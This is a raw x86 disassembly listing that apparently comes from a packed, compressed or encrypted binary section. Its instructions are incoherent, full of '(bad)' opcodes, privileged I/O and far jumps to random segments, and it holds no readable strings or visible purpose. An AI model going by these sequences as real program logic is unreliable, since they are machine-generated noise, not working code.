  414da4:	xor    al,0x1a
  414da6:	pop    ebp
  414da7:	daa    
  414da8:	stos   DWORD PTR es:[edi],eax
  414da9:	adc    cl,dl
  414dab:	pop    ss
  414dac:	xchg   edi,eax
  414dad:	jp     0x414d90
  414daf:	sbb    DWORD PTR [ebx-0x52ed0185],ebx
  414db5:	pop    esp
  414db6:	fisub  WORD PTR [edx+0x7cbbb133]
  414dbc:	mov    esp,0x54af61d0
  414dc1:	aad    0x12
  414dc3:	mov    ch,0x89
  414dc5:	cli    
  414dc6:	push   edi
  414dc7:	jmp    0x414d4c
  414dc9:	mov    ecx,0x790309b0
  414dce:	outs   dx,DWORD PTR ds:[esi]
  414dcf:	cmp    al,ah
  414dd1:	mov    bl,0x60
  414dd3:	inc    edx
  414dd4:	jnp    0x414e22
  414dd6:	add    DWORD PTR [edi-0x5b],esp
  414dd9:	hlt    
  414dda:	xchg   ebp,eax
  414ddb:	ror    BYTE PTR [edx],0x1d
  414dde:	setg   BYTE PTR [edi+0x5f28445d]
  414de5:	out    dx,eax
  414de6:	stos   BYTE PTR es:[edi],al
  414de7:	aas    
  414de8:	xor    al,0x5c
  414dea:	add    al,0xd3
  414dec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ded:	clc    
  414dee:	(bad)  
  414def:	sbb    DWORD PTR [edi],ecx
  414df1:	imul   edi,DWORD PTR [edx-0x54],0x31
  414df5:	pushf  
  414df6:	in     eax,0x18
  414df8:	fcom   QWORD PTR [eax-0x16352d5c]
  414dfe:	hlt    
  414dff:	push   ss
  414e00:	jg     0x414e0d
  414e02:	or     DWORD PTR [edi+0x55f2b3ca],ecx
  414e08:	iret   
  414e09:	sbb    al,0x4a
  414e0b:	mov    ebp,0x934c81ca
  414e10:	scas   eax,DWORD PTR es:[edi]
  414e11:	sub    eax,0xde9d76c0
  414e16:	push   esp
  414e17:	inc    edx
  414e18:	jl     0x414ddb
  414e1a:	add    BYTE PTR [edx-0x4fa29cd2],al
  414e20:	repz sbb al,0x18
  414e23:	test   DWORD PTR [eax-0x75e14cae],0x82dfb0ad
  414e2d:	add    BYTE PTR [edi+0x31],cl
  414e30:	fcom   DWORD PTR ds:0xfed25348
  414e36:	or     esi,DWORD PTR [edi-0x29]
  414e39:	outs   dx,BYTE PTR ds:[esi]
  414e3a:	push   ebp
  414e3b:	outs   dx,BYTE PTR ds:[esi]
  414e3c:	fcom   QWORD PTR [ebx+0x6b]
  414e3f:	pop    es
  414e40:	mov    edi,0xe0882aac
  414e45:	pusha  
  414e46:	ins    BYTE PTR es:[edi],dx
  414e47:	jae    0x414dd9
  414e49:	jmp    0x100e:0x11912960
  414e50:	jns    0x414e08
  414e52:	or     BYTE PTR [ebx+0x65b32461],ch
  414e58:	mov    ebp,0x776d10d2
  414e5d:	xchg   esp,eax
  414e5e:	mov    al,0xfd
  414e60:	data16 in al,0xfa
  414e63:	sar    dl,1
  414e65:	gs out dx,al
  414e67:	inc    esp
  414e68:	mov    esi,0x6c9ef8fe
  414e6d:	repz (bad) 
  414e6f:	jae    0x414edd
  414e71:	(bad)  
  414e72:	sub    eax,0x63610616
  414e77:	call   0xb39f:0xba2f850c
  414e7e:	sbb    BYTE PTR [esi+0x3f],ah
  414e81:	xor    edi,DWORD PTR [ecx]
  414e83:	lods   al,BYTE PTR ds:[esi]
  414e84:	lahf   
  414e85:	pop    ebx
  414e86:	js     0x414ebf
  414e88:	jle    0x414f03
  414e8a:	(bad)  
  414e8b:	sub    ebp,DWORD PTR [edi]
  414e8d:	ret    
  414e8e:	mov    ah,0x70
  414e90:	aad    0x81
  414e92:	mov    eax,0xc4f1e119
  414e97:	push   ds
  414e98:	cmp    ah,dh
  414e9a:	out    0x46,eax
  414e9c:	jnp    0x414ed8
  414e9e:	mov    ?,WORD PTR [ebx]
  414ea0:	stos   DWORD PTR es:[edi],eax
  414ea1:	dec    ecx
  414ea2:	ffree  st(4)
  414ea4:	aas    
  414ea5:	lock popf 
  414ea7:	dec    ecx
  414ea8:	push   edi
  414ea9:	mov    cl,0x1d
  414eab:	pop    ss
  414eac:	sbb    esi,ebx
  414eae:	jge    0x414e83
  414eb0:	or     ch,BYTE PTR [edx-0x41]
  414eb3:	call   0xc9301ac7
  414eb8:	xchg   esp,eax
  414eb9:	push   esi
  414eba:	xlat   BYTE PTR ds:[ebx]
  414ebb:	aam    0x9a
  414ebd:	ja     0x414ef7
  414ebf:	cmp    bl,bl
  414ec1:	shl    DWORD PTR [ebp+0x652d7a60],1
  414ec7:	mov    ah,0x91
  414ec9:	mov    cl,0x3f
  414ecb:	sbb    BYTE PTR [edx-0x5f],0x31
  414ecf:	test   eax,0x49572a5a
  414ed4:	js     0x414f02
  414ed6:	xchg   ebx,eax
  414ed7:	mov    DWORD PTR [ebp-0x40057d4c],edx
  414edd:	jecxz  0x414f35
  414edf:	ror    ah,0xd0
  414ee2:	mov    WORD PTR [esi-0xf6c3cf8],?
  414ee8:	inc    ebp
  414ee9:	das    
  414eea:	test   DWORD PTR [ecx+0xe2c51fa],edi
  414ef0:	sbb    BYTE PTR [ecx+0xb13b6d5],dl
  414ef6:	and    eax,0xa3079d64
  414efb:	add    BYTE PTR [esp+edx*8],bl
  414efe:	pushf  
  414eff:	and    DWORD PTR [eax+0x1111eaae],ebx
  414f05:	xor    DWORD PTR [edi-0xf],edx
  414f08:	out    dx,eax
  414f09:	sbb    DWORD PTR [ebx+0x51fe1b00],esi
  414f0f:	adc    BYTE PTR [esp+edi*4],ch
  414f12:	repnz adc edi,ebp
  414f15:	add    eax,0x21e6270a
  414f1a:	sbb    eax,0xa7779238
  414f1f:	mov    ch,0x1c
  414f21:	sbb    eax,0x2fbb8248
  414f26:	cld    
  414f27:	jp     0x414f5a
  414f29:	jge    0x414f67
  414f2b:	retf   0x31a9
  414f2e:	neg    BYTE PTR [edx]
  414f30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f31:	outs   dx,DWORD PTR ds:[esi]
  414f32:	retf   
  414f33:	inc    BYTE PTR [eax]
  414f35:	rol    DWORD PTR [ecx+ebp*4],0xe
  414f39:	xchg   edx,eax
  414f3a:	sub    dl,BYTE PTR [esi-0x2c2d9b6a]
  414f40:	push   ss
  414f41:	mov    edx,0xadf1b07a
  414f46:	(bad)
  414f49:	in     al,0x1
  414f4b:	hlt    
  414f4c:	daa    
  414f4d:	retf   0x25dd
  414f50:	ss push es
  414f52:	(bad)  
  414f53:	xor    BYTE PTR [edx],bh
  414f55:	cmp    esi,DWORD PTR [eax-0x1e]
  414f58:	out    0xbc,al
  414f5a:	cmp    BYTE PTR [ecx],bh
  414f5c:	cmp    BYTE PTR [eax],al
  414f5e:	rcr    BYTE PTR [eax],cl
  414f60:	icebp  
  414f61:	cmc    
  414f62:	add    edi,0xfcd6382f
  414f68:	mov    ah,0x23
  414f6a:	xchg   ecx,eax
  414f6b:	hlt    
  414f6c:	mov    ds:0xc901be96,al
  414f71:	lock inc esi
  414f73:	popa   
  414f74:	imul   esp,DWORD PTR [esi-0x2bf765ad],0x4
  414f7b:	loop   0x414fbe
  414f7d:	cli    
  414f7e:	jne    0x414f81
  414f80:	and    eax,0x8a609a79
  414f85:	push   ebx
  414f86:	xor    BYTE PTR [esi],0xef
  414f89:	mov    al,ds:0x654db352
  414f8e:	sbb    ah,BYTE PTR ds:[esi+0x56]
  414f92:	(bad)  
  414f93:	xchg   edi,eax
  414f94:	cmp    BYTE PTR [ebp+0x602d60cc],dl
  414f9a:	mov    ebx,0xf8b8ae6b
  414f9f:	mov    ecx,0x62d51ea4
  414fa4:	pop    ebx
  414fa5:	ins    DWORD PTR es:[edi],dx
  414fa6:	lea    ecx,[edx+0x1a]
  414fa9:	add    edi,ecx
  414fab:	sbb    DWORD PTR [ebx],ebp
  414fad:	jp     0x414f3c
  414faf:	dec    BYTE PTR [edi+0x6f5de395]
  414fb5:	std    
  414fb6:	add    al,0x41
  414fb8:	pop    ecx
  414fb9:	loopne 0x414f51
  414fbb:	es mov ecx,0x53f202f1
  414fc1:	stos   BYTE PTR es:[edi],al
  414fc2:	dec    ecx
  414fc3:	jb     0x414fc2
  414fc5:	pop    eax
  414fc6:	jg     0x414f7d
  414fc8:	jno    0x414f86
  414fca:	cmp    dl,ch
  414fcc:	sti    
  414fcd:	lock stos BYTE PTR es:[edi],al
  414fcf:	add    eax,0xabba423c
  414fd4:	stc    
  414fd5:	xor    al,0x4
  414fd7:	call   0xfd71:0xdf2bff4d
  414fde:	neg    BYTE PTR [edx+0x68]
  414fe1:	cmp    ch,BYTE PTR [edx-0x51]
  414fe4:	adc    BYTE PTR [eax+edi*8-0x71],bh
  414fe8:	lahf   
  414fe9:	ret    
  414fea:	ins    BYTE PTR es:[edi],dx
  414feb:	pop    eax
  414fec:	mov    eax,ds:0x60014ce
  414ff1:	repnz sti 
  414ff3:	sub    ah,dh
  414ff5:	pushf  
  414ff6:	xor    DWORD PTR [ebp-0x3b13c631],edi
  414ffc:	int3   
  414ffd:	popa   
  414ffe:	imul   esp,edx,0xfcdc9301
  415004:	imul   edi,DWORD PTR [ecx],0x799fb73d
  41500a:	mov    eax,ds:0x56439ff0
  41500f:	push   eax
  415010:	ja     0x41503a
  415012:	into   
  415013:	ror    dh,0x91
  415016:	fcomp  DWORD PTR [ebx-0x5bc44e8c]
  41501c:	pop    es
  41501d:	push   ds
  41501e:	adc    eax,0x45fc61a5
  415023:	add    al,0x86
  415025:	in     al,0xb4
  415027:	bound  edi,QWORD PTR [esi+eiz*8+0x1b]
  41502b:	add    ebp,esi
  41502d:	mov    ecx,0xd94aee63
  415032:	jno    0x415058
  415034:	je     0x414fc7
  415036:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415037:	loope  0x4150a9
  415039:	mov    ecx,edx
  41503b:	dec    ebp
  41503c:	addr16 adc cl,cl
  41503f:	mov    dl,0x2c
  415041:	xor    ebp,DWORD PTR [ebp-0x5b777d85]
  415047:	mov    dh,0xd0
  415049:	lea    ebp,[eax]
  41504b:	mov    eax,0x8a0a8b36
  415050:	sbb    BYTE PTR [edi],ch
  415052:	test   eax,0x9218d1fc
  415057:	cmp    DWORD PTR [esi+edi*1],esi
  41505a:	push   eax
  41505b:	test   BYTE PTR [edx],dl
  41505d:	mov    al,ds:0x4d46a9dc
  415062:	adc    al,0x6
  415064:	jbe    0x41503f
  415066:	out    0xa0,al
  415068:	xor    ebp,esi
  41506a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41506b:	cdq    
  41506c:	lods   eax,DWORD PTR ds:[esi]
  41506d:	pop    esi
  41506e:	sar    bh,cl
  415070:	rcl    ch,1
  415072:	stos   BYTE PTR es:[edi],al
  415073:	adc    al,dh
  415075:	mov    ch,0x81
  415077:	inc    eax
  415078:	(bad)  
  415079:	cld    
  41507a:	xchg   esi,eax
  41507b:	sub    ebp,DWORD PTR [ecx-0x18]
  41507e:	or     BYTE PTR [esi+0x2d23ebdf],ah
  415084:	in     eax,dx
  415085:	stc    
  415086:	test   BYTE PTR ds:0x611beca5,bl
  41508c:	adc    al,0x59
  41508e:	mov    bl,0xc9
  415090:	in     eax,dx
  415091:	pop    esp
  415092:	test   BYTE PTR [edi+0x3317e7ed],dl
  415098:	dec    esi
  415099:	sbb    DWORD PTR [ebp+0x1e],ecx
  41509c:	add    bh,BYTE PTR [ecx-0x50]
  41509f:	push   ebx
  4150a0:	pop    ss
  4150a1:	sti    
  4150a2:	add    bh,BYTE PTR cs:[edi+0x4da3e14a]
  4150a9:	jno    0x41507b
  4150ab:	add    al,0xf5
  4150ad:	and    BYTE PTR [edx-0x3f],ch
  4150b0:	into   
  4150b1:	inc    ebp
  4150b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150b3:	mov    fs,WORD PTR [esi-0x6d2d3283]
  4150b9:	test   DWORD PTR [ecx+0x44e8ec0],ebx
  4150bf:	dec    edi
  4150c0:	les    esp,FWORD PTR [eax-0x61e09ca5]
  4150c6:	sbb    BYTE PTR [eax+0x2158267d],0x5f
  4150cd:	jmp    0xcb528390
  4150d2:	xchg   esp,eax
  4150d3:	adc    DWORD PTR [esi],ebp
  4150d5:	sahf   
  4150d6:	retf   0x61d4
  4150d9:	sub    DWORD PTR [edx+ebp*8+0x6a822980],ebp
  4150e0:	inc    ebp
  4150e1:	pop    esi
  4150e2:	pop    eax
  4150e3:	sub    BYTE PTR [ebp+0x41],dl
  4150e6:	cdq    
  4150e7:	add    BYTE PTR [ecx],0x82
  4150ea:	ss int3 
  4150ec:	mov    al,BYTE PTR [esi+ebx*1-0x19]
  4150f0:	or     ah,al
  4150f2:	into   
  4150f3:	scas   al,BYTE PTR es:[edi]
  4150f4:	and    DWORD PTR [edi+esi*8],ebp
  4150f7:	pop    esi
  4150f8:	mov    ebp,0xcd89e555
  4150fd:	jno    0x415156
  4150ff:	shr    DWORD PTR [ebp-0x7a],0x84
  415103:	xor    DWORD PTR [ecx+0x10],ebx
  415106:	cmp    ah,ah
  415108:	sub    dh,BYTE PTR [ebx-0x48ed2904]
  41510e:	rol    edi,1
  415110:	mov    cl,0x15
  415112:	call   0xf2ef:0xcf62af38
  415119:	ror    BYTE PTR [esi+eax*1+0x76],0xe
  41511e:	shl    esi,1
  415120:	inc    esi
  415121:	inc    edx
  415122:	fabs   
  415124:	jmp    0x181c:0x555636bc
  41512b:	xor    al,0x1f
  41512d:	push   cs
  41512e:	sub    dh,al
  415130:	or     cl,bl
  415132:	out    0xf9,eax
  415134:	seta   BYTE PTR [esi-0x57264c44]
  41513b:	jp     0x4151af
  41513d:	inc    esi
  41513e:	add    ch,BYTE PTR [ebx-0x6a9abf3c]
  415144:	sbb    cl,BYTE PTR [edi+0x60]
  415147:	pop    edi
  415148:	pop    esp
  415149:	(bad)  
  41514a:	sahf   
  41514b:	int3   
  41514c:	push   cs
  41514d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41514e:	dec    esp
  41514f:	pop    ebx
  415150:	jp     0x415145
  415152:	ss loope 0x41517c
  415155:	sbb    dl,ch
  415157:	cmp    dl,cl
  415159:	push   0x73
  41515b:	xor    dl,dl
  41515d:	pop    es
  41515e:	mov    ecx,0xb0dbaf13
  415163:	bound  ebp,QWORD PTR [esi-0x21a809bf]
  415169:	aas    
  41516a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41516b:	mov    WORD PTR [ebx],fs
  41516d:	mul    DWORD PTR [edx]
  41516f:	fwait
  415170:	sbb    al,0xfc
  415172:	pop    ebp
  415173:	ficomp WORD PTR [ecx-0x75]
  415176:	scas   al,BYTE PTR es:[edi]
  415177:	aas    
  415178:	rcr    BYTE PTR [eax-0x3544ee67],1
  41517e:	inc    DWORD PTR [ecx-0x2a]
  415181:	popa   
  415182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415183:	fmul   DWORD PTR [ecx-0x7d78837a]
  415189:	push   edi
  41518a:	or     ecx,DWORD PTR [edi]
  41518c:	xor    al,0xd4
  41518e:	and    eax,0x1c09820f
  415193:	into   
  415194:	and    eax,0x2b0e135c
  415199:	mov    dh,0xa6
  41519b:	repz sub al,BYTE PTR [esi-0x70257c0d]
  4151a2:	repnz sub edx,DWORD PTR [eax]
  4151a5:	and    ebx,DWORD PTR [esi-0x64ca071b]
  4151ab:	push   0x3dab6f34
  4151b0:	dec    edx
  4151b1:	sbb    al,0x3b
  4151b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151b4:	cdq    
  4151b5:	ins    DWORD PTR es:[edi],dx
  4151b6:	int    0x9
  4151b8:	retf   0xa95a
  4151bb:	(bad)  
  4151bd:	arpl   WORD PTR [edi+0x2d4bec33],sp
  4151c3:	lds    eax,FWORD PTR [esi]
  4151c5:	mov    ah,0xb6
  4151c7:	dec    esp
  4151c8:	pop    ebx
  4151c9:	stc    
  4151ca:	add    ah,BYTE PTR [ebp+0x6f]
  4151cd:	in     eax,dx
  4151ce:	pop    ebx
  4151cf:	add    bl,al
  4151d1:	out    dx,eax
  4151d2:	sub    al,0x66
  4151d4:	mov    ?,eax
  4151d6:	mov    WORD PTR [ebp+0x6b3ffe8b],ss
  4151dc:	shl    bh,0x2
  4151df:	dec    edi
  4151e0:	adc    al,0xe1
  4151e2:	or     edx,DWORD PTR [ebx+0x2e34dfba]
  4151e8:	pusha  
  4151e9:	aam    0x6c
  4151eb:	fisub  DWORD PTR [eax+0x2c]
  4151ee:	std    
  4151ef:	and    bh,BYTE PTR [ecx-0x6]
  4151f2:	ror    BYTE PTR [esi],1
  4151f4:	inc    ecx
  4151f5:	sbb    ebp,DWORD PTR ds:[edi-0x70]
  4151f9:	(bad)  
  4151fa:	push   0x53
  4151fc:	and    ch,al
  4151fe:	call   0xc45d:0xd0667cda
  415205:	inc    edi
  415206:	popf   
  415207:	fsubr  st,st(0)
  415209:	in     eax,dx
  41520a:	das    
  41520b:	nop
  41520c:	inc    ebp
  41520d:	dec    edx
  41520e:	shl    DWORD PTR [ebp+0x27c112a9],0xea
  415215:	dec    edx
  415216:	adc    DWORD PTR fs:[edi+0x4d],ecx
  41521a:	push   esp
  41521b:	loope  0x4151d9
  41521d:	dec    ebx
  41521e:	and    ebx,DWORD PTR [edx]
  415220:	out    0x95,ax
  415223:	pop    edi
  415224:	jno    0x415279
  415226:	push   ebp
  415227:	mov    ebx,DWORD PTR [eax+ecx*8]
  41522a:	jo     0x4151fa
  41522c:	stos   DWORD PTR es:[edi],eax
  41522d:	and    al,BYTE PTR [ebp+0x33]
  415230:	jbe    0x415267
  415232:	add    eax,0x5348d664
  415237:	push   edi
  415238:	mov    ds:0x2b472aaf,eax
  41523d:	xchg   ebp,eax
  41523e:	xor    eax,0x1d6d5974
  415243:	mov    WORD PTR ds:0x23f2288b,gs
  415249:	or     DWORD PTR [esi-0x4b8bc0f],0x6cf13e6d
  415253:	sar    esi,0xf0
  415256:	or     al,0x63
  415258:	retf   
  415259:	push   ecx
  41525a:	push   cs
  41525b:	test   BYTE PTR [ecx-0x69],ch
  41525e:	daa    
  41525f:	icebp  
  415260:	jnp    0x4152bf
  415262:	(bad)  [edx]
  415264:	pop    ecx
  415265:	aaa    
  415266:	es and eax,0x53dc370
  41526c:	(bad)  
  41526d:	mov    al,0x94
  41526f:	repnz (bad) 
  415271:	mov    ch,0xcc
  415273:	retf   
  415274:	cmp    ebp,DWORD PTR [ebx]
  415276:	push   ecx
  415277:	lock mov ebx,0x187004e1
  41527d:	(bad)  
  41527f:	jge    0x41525d
  415281:	std    
  415282:	jmp    0x62cb:0x115a8e8b
  415289:	pop    esi
  41528a:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41528c:	stc    
  41528d:	xchg   esp,eax
  41528e:	pop    esp
  41528f:	push   esp
  415290:	out    0x13,eax
  415292:	adc    ch,BYTE PTR ds:0xf7289759
  415298:	jmp    0x4152e5
  41529a:	mov    cl,0xeb
  41529c:	dec    edi
  41529d:	xchg   esp,eax
  41529e:	inc    edi
  41529f:	cmp    esp,DWORD PTR [ecx+0x6c0cee40]
  4152a5:	and    eax,0x194379ce
  4152aa:	or     eax,0xe9623962
  4152af:	sub    al,0xb4
  4152b1:	shr    BYTE PTR [ecx+0x579f6e1a],1
  4152b7:	in     al,dx
  4152b8:	in     al,0x49
  4152ba:	push   esi
  4152bb:	push   ecx
  4152bc:	ret    0x73e2
  4152bf:	inc    ecx
  4152c0:	push   ss
  4152c1:	jne    0x41533d
  4152c3:	sbb    eax,0xd0a92264
  4152c8:	sbb    DWORD PTR [edx-0x45ec357c],esi
  4152ce:	jnp    0x415332
  4152d0:	dec    ecx
  4152d1:	sahf   
  4152d2:	daa    
  4152d3:	mov    dh,BYTE PTR [edx+edx*8+0x4b1a9a18]
  4152da:	push   esi
  4152db:	xor    DWORD PTR [edx+eax*1+0x20],edi
  4152df:	call   FWORD PTR [ebp+0x69]
  4152e2:	in     al,0x46
  4152e4:	(bad)  
  4152e5:	out    0x42,al
  4152e7:	cdq    
  4152e8:	pop    ds
  4152e9:	shr    BYTE PTR [ecx+0x3e0a90ac],0xcf
  4152f0:	data16 stc 
  4152f2:	xchg   edx,eax
  4152f3:	adc    cl,BYTE PTR [esi]
  4152f5:	inc    ebx
  4152f6:	inc    esp
  4152f7:	lea    edx,[edi+0x7c]
  4152fa:	or     DWORD PTR [edx+0x2e1894f],ebx
  415300:	push   edx
  415301:	adc    DWORD PTR ds:0xf2c812f8,edi
  415307:	mov    bh,BYTE PTR [eax-0x290f4bf5]
  41530d:	push   0xffffffb5
  41530f:	ins    DWORD PTR es:[edi],dx
  415310:	or     ebp,DWORD PTR [ecx+0x6c]
  415313:	pmulhuw mm6,QWORD PTR [ecx+0x4d]
  415317:	sub    eax,0x394320d3
  41531c:	mov    al,0x90
  41531e:	ins    BYTE PTR es:[edi],dx
  41531f:	or     ch,BYTE PTR [edi]
  415321:	mov    DWORD PTR [ecx],0x9fd1c929
  415327:	clc    
  415328:	sbb    al,al
  41532a:	call   0x835b:0xb21a5034
  415331:	(bad)  
  415332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415333:	pop    esi
  415334:	rol    BYTE PTR [ecx+0x6a60a86f],0xee
  41533b:	lods   eax,DWORD PTR ds:[esi]
  41533c:	push   edi
  41533d:	mov    ds:0x647a5ec3,al
  415342:	push   es
  415343:	shl    ecx,0x8f
  415346:	addr16 push ds
  415348:	sahf   
  415349:	(bad)  
  41534a:	or     eax,DWORD PTR [ebp-0x26]
  41534d:	out    0x71,eax
  41534f:	(bad)  
  415350:	adc    ebx,edi
  415352:	shl    BYTE PTR [ecx+0xd],1
  415355:	rcl    BYTE PTR [edi+0x7],0x60
  415359:	bound  ebx,QWORD PTR [esi+0x2c411bc]
  41535f:	out    0xbe,al
  415361:	sar    BYTE PTR [ecx-0x4e],cl
  415364:	push   ss
  415365:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415366:	push   esi
  415367:	xor    al,0x97
  415369:	ja     0x415391
  41536b:	mov    ds:0x1afe2f14,al
  415370:	retf   0xb224
  415373:	jl     0x41536a
  415375:	inc    edi
  415376:	in     eax,dx
  415377:	cmp    eax,0xf7e57c47
  41537c:	mov    ds:0x73e4e1ab,eax
  415381:	int3   
  415382:	icebp  
  415383:	jnp    0x41532c
  415385:	cmp    BYTE PTR [eax+0x5c],0xb4
  415389:	inc    eax
  41538a:	and    al,BYTE PTR [esp+ebx*8]
  41538d:	cmp    bh,bh
  41538f:	aad    0x36
  415391:	inc    edx
  415392:	out    dx,al
  415393:	pop    edx
  415394:	inc    ebx
  415395:	inc    ebp
  415396:	leave  
  415397:	hlt    
  415398:	jb     0x4153ee
  41539a:	mov    ch,0xbd
  41539c:	mov    dl,0x94
  41539e:	sbb    al,0x4c
  4153a0:	mov    eax,ds:0xe0b2219d
  4153a5:	sub    BYTE PTR es:[edi+0x55c3d263],ah
  4153ac:	xor    BYTE PTR [ecx-0x63a7a6c7],ch
  4153b2:	mov    ds:0x42f36f50,al
  4153b7:	inc    ebp
  4153b8:	pusha  
  4153b9:	pushf  
  4153ba:	inc    ecx
  4153bb:	and    cl,BYTE PTR [esp+ecx*2-0x2594e14f]
  4153c2:	jp     0x415369
  4153c4:	jge    0x4153c9
  4153c6:	xchg   ebx,eax
  4153c7:	xchg   edi,eax
  4153c8:	adc    eax,0x86138a07
  4153cd:	cld    
  4153ce:	pop    ebp
  4153cf:	stos   BYTE PTR es:[edi],al
  4153d0:	mov    edi,DWORD PTR [edi-0x1ebb2c6a]
  4153d6:	in     eax,dx
  4153d7:	inc    esi
  4153d8:	fwait
  4153d9:	cs or  al,0x5e
  4153dc:	xor    eax,0x22a9cf80
  4153e1:	ret    0xb9be
  4153e4:	mov    al,ds:0x5e06d83a
  4153e9:	cdq    
  4153ea:	and    al,0x58
  4153ec:	test   al,0xc7
  4153ee:	imul   ebx,edi,0xffffffb5
  4153f1:	(bad)  
  4153f3:	cwde   
  4153f4:	push   edi
  4153f5:	mov    BYTE PTR [ebx+ebx*4-0x1b],dh
  4153f9:	sub    ebx,DWORD PTR [ebx-0x25]
  4153fc:	sbb    al,dl
  4153fe:	sub    edi,DWORD PTR ds:0xa3477f6c
  415404:	stos   DWORD PTR es:[edi],eax
  415405:	fs in  eax,dx
  415407:	ret    
  415408:	lea    ecx,[ebx+edi*2+0x630c1461]
  41540f:	retf   0xab01
  415412:	mov    bl,0xd6
  415414:	pop    esp
  415415:	pop    ecx
  415416:	mov    WORD PTR [edx-0x44],fs
  415419:	adc    eax,0xde23eba7
  41541e:	addr16 cli 
  415420:	nop
  415421:	add    DWORD PTR [edi],edx
  415423:	mov    ebp,0x1ed0b637
  415428:	mov    eax,ds:0xac4d549b
  41542d:	aas    
  41542e:	leave  
  41542f:	mov    dl,0xef
  415431:	jbe    0x4153ca
  415433:	lods   al,BYTE PTR ds:[esi]
  415434:	jb     0x415431
  415436:	push   ebp
  415437:	cmp    BYTE PTR [edi+0x18],dl
  41543a:	lss    edi,FWORD PTR [ebp+ebx*2-0x2145e439]
  415442:	push   cs
  415443:	mov    cl,0xea
  415445:	push   ss
  415446:	push   ebx
  415447:	xchg   edi,eax
  415448:	in     al,0x27
  41544a:	cmp    eax,0x239b5dff
  41544f:	loop   0x41546d
  415451:	push   esp
  415452:	je     0x415433
  415454:	sub    al,0xb6
  415456:	out    0x54,eax
  415458:	xchg   esi,eax
  415459:	pop    ds
  41545a:	xor    BYTE PTR [edx],dl
  41545c:	mov    ah,BYTE PTR [ecx+0x16c52a17]
  415462:	loopne 0x4154bb
  415464:	dec    ebx
  415465:	pop    es
  415466:	ins    BYTE PTR es:[edi],dx
  415467:	cmc    
  415468:	add    ebx,DWORD PTR [ebx]
  41546a:	outs   dx,DWORD PTR ds:[esi]
  41546b:	jmp    0xe9b8c644
  415470:	stos   DWORD PTR es:[edi],eax
  415471:	mov    ecx,DWORD PTR [edi]
  415473:	in     al,0x2a
  415475:	sbb    dl,bl
  415477:	dec    esi
  415478:	inc    edi
  415479:	in     al,dx
  41547a:	cmc    
  41547b:	mov    dl,0x44
  41547d:	stc    
  41547e:	lea    esp,[ebp-0x650538da]
  415484:	xchg   BYTE PTR [esi-0x243059d0],al
  41548a:	or     eax,0x93b6a116
  41548f:	dec    esp
  415490:	xor    DWORD PTR [eax+0x73ad98a5],eax
  415496:	nop
  415497:	mov    edx,0x7b6ad571
  41549c:	cdq    
  41549d:	nop
  41549e:	out    dx,al
  41549f:	xchg   BYTE PTR [ebp+0x5b121c94],ah
  4154a5:	retf   0x8c4d
  4154a8:	loopne 0x4154dd
  4154aa:	retf   0x1f70
  4154ad:	xor    dh,BYTE PTR [edx]
  4154af:	jnp    0x4154ef
  4154b1:	xor    bl,BYTE PTR ds:0xd8ad6687
  4154b7:	push   eax
  4154b8:	jg     0x415471
  4154ba:	dec    edx
  4154bb:	jno    0x4154fa
  4154bd:	mov    eax,0xc1658480
  4154c2:	rol    DWORD PTR [ecx],0x5
  4154c5:	int    0x57
  4154c7:	add    ebx,esp
  4154c9:	inc    edx
  4154ca:	mov    dl,0x79
  4154cc:	neg    DWORD PTR [edi]
  4154ce:	dec    esp
  4154cf:	std    
  4154d0:	adc    al,BYTE PTR [esi-0x20]
  4154d3:	xchg   edi,eax
  4154d4:	call   0x5dc6:0xb3aca507
  4154db:	(bad)  
  4154dc:	aaa    
  4154dd:	xor    eax,0x77ce6b64
  4154e2:	fbstp  TBYTE PTR [edx+0x76f2f568]
  4154e8:	(bad)  
  4154e9:	pop    ebp
  4154ea:	sbb    DWORD PTR ss:[esi-0x41],eax
  4154ee:	jmp    0x4154d9
  4154f0:	mov    bh,0xe9
  4154f2:	ss xor eax,0xb3d8b144
  4154f8:	das    
  4154f9:	jbe    0x415576
  4154fb:	aas    
  4154fc:	rol    DWORD PTR [eax],cl
  4154fe:	cmp    ebp,eax
  415500:	adc    eax,0x1ec84b54
  415505:	addr16 ret 
  415507:	outs   dx,BYTE PTR ds:[esi]
  415508:	mov    ebx,0xd6e6c89e
  41550d:	imul   BYTE PTR [edx]
  41550f:	push   ds
  415510:	xchg   ebp,eax
  415511:	and    al,BYTE PTR [ecx+0x13a8302b]
  415517:	add    esp,eax
  415519:	mov    ds:0xdb77c28b,al
  41551e:	fs dec ecx
  415520:	jecxz  0x415594
  415522:	push   es
  415523:	ret    0xaa67
  415526:	jns    0x4154b8
  415528:	int    0x28
  41552a:	jnp    0x415517
  41552c:	pop    es
  41552d:	sar    dl,cl
  41552f:	xchg   esp,eax
  415530:	inc    esp
  415531:	std    
  415532:	mov    edi,0x822e9431
  415537:	aam    0xc4
  415539:	ins    DWORD PTR es:[edi],dx
  41553a:	outs   dx,DWORD PTR ds:[esi]
  41553b:	or     BYTE PTR [ebp+0x6c],al
  41553e:	sub    DWORD PTR [ebp+0x33],edi
  415541:	rol    BYTE PTR [ebp+0xbabd16a],1
  415547:	push   esp
  415548:	into   
  415549:	hlt    
  41554a:	stc    
  41554b:	shl    dh,1
  41554d:	and    eax,0x5a20ec22
  415552:	or     BYTE PTR [ebx-0x73],dl
  415555:	pop    esp
  415556:	dec    edi
  415557:	push   0x7e1844cb
  41555c:	cmp    BYTE PTR [ebp-0x4fb0ec04],cl
  415562:	xchg   DWORD PTR [eax+0x4cb76ebe],ecx
  415568:	aad    0x2d
  41556a:	cs je  0x415550
  41556d:	mov    esi,0x57b14c37
  415572:	inc    ecx
  415573:	test   BYTE PTR [esi+0x4a8170eb],bl
  415579:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41557a:	shl    DWORD PTR [ebp+0x45],0x3f
  41557e:	xor    esi,esi
  415580:	cmp    eax,0x3449a192
